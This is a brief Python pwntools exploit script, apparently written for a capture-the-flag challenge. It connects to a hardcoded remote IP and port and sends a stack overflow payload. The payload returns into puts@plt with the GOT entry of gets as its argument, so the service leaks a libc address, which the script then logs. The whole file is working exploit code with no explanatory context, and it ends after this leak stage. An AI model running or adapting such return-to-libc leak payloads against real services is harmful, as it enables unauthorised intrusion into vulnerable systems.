#!/usr/bin/env python3
from pwn import *

conn = remote('46.101.107.117', 2113)

payload = b''
payload += b'B' * 13
payload += p32(0x8048480)		# puts@plt
payload += b'CCCC'
payload += p32(0x804a010)		# gets@got.plt

conn.sendline(payload)
conn.recvuntil('Mariner\n\n')
data =conn.recv(4)
conn.close()

leak = int.from_bytes(data, 'little')
log.info('leak: ' + hex(leak))
